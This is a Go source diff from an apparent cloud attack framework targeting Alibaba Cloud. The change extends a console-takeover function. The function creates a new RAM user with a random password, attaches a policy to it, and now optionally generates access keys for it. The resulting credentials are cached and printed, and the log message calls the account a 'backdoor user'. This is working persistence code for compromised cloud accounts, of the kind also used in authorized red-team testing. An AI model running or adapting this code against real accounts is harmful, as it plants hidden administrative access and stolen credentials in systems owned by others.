@@ -23,7 +23,7 @@ func CreateUser(userName string) {
 		log.Debugf("创建 %s 用户成功 (Create %s user successfully)", userName, userName)
 	} else {
 		if strings.Contains(err.Error(), "EntityAlreadyExists.User") {
-			log.Warnf("%s 用户已存在，无法接管，请指定其他的用户名 (%s user already exists and cannot take over, please specify another user name.)", userName, userName)
+			log.Warnf("%s 用户已存在，无法接管，请使用 -u 参数指定其他的用户名 (%s user already exists and cannot be take over, please use the -u parameter to specify another user name.)", userName, userName)
 			os.Exit(0)
 		}
 	}
@@ -63,8 +63,23 @@ func GetAccountAlias() string {
 	return accountAlias
 }
 
-func TakeoverConsole(userName string) {
+func CreateAccessKey(userName string) (string, string) {
+	request := ram.CreateCreateAccessKeyRequest()
+	request.Scheme = "https"
+	request.UserName = userName
+	response, err := aliram.RAMClient().CreateAccessKey(request)
+	errutil.HandleErrNoExit(err)
+	return response.AccessKey.AccessKeyId, response.AccessKey.AccessKeySecret
+}
+
+func TakeoverConsole(userName string, accessKeyFlag bool) {
 	CreateUser(userName)
+	var accessKeyId, accessKeySecret string
+	accessKeyId = "N/A"
+	accessKeySecret = "N/A"
+	if accessKeyFlag {
+		accessKeyId, accessKeySecret = CreateAccessKey(userName)
+	}
 	password := util.GenerateRandomPasswords()
 	CreateLoginProfile(userName, password)
 	AttachPolicyToUser(userName)
@@ -72,10 +87,10 @@ func TakeoverConsole(userName string) {
 	consoleUserName := fmt.Sprintf("%s@%s", userName, accountAlias)
 	loginURL := "https://signin.aliyun.com"
 	data := [][]string{
-		{consoleUserName, password, loginURL},
+		{consoleUserName, password, loginURL, accessKeyId, accessKeySecret},
 	}
-	database.InsertTakeoverConsoleCache("alibaba", accountAlias, consoleUserName, password, loginURL)
-	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
+	database.InsertTakeoverConsoleCache("alibaba", accountAlias, consoleUserName, password, loginURL, accessKeyId, accessKeySecret)
+	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)", "Access Key Id", "Access Key Secret"}
 	var td = cloud.TableData{Header: header, Body: data}
 	cloud.PrintTable(td, "")
 	log.Infof("接管控制台成功，接管控制台会创建 %s 后门用户，如果想删除该后门用户，请执行 cf alibaba console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf alibaba console cancel.)", userName)
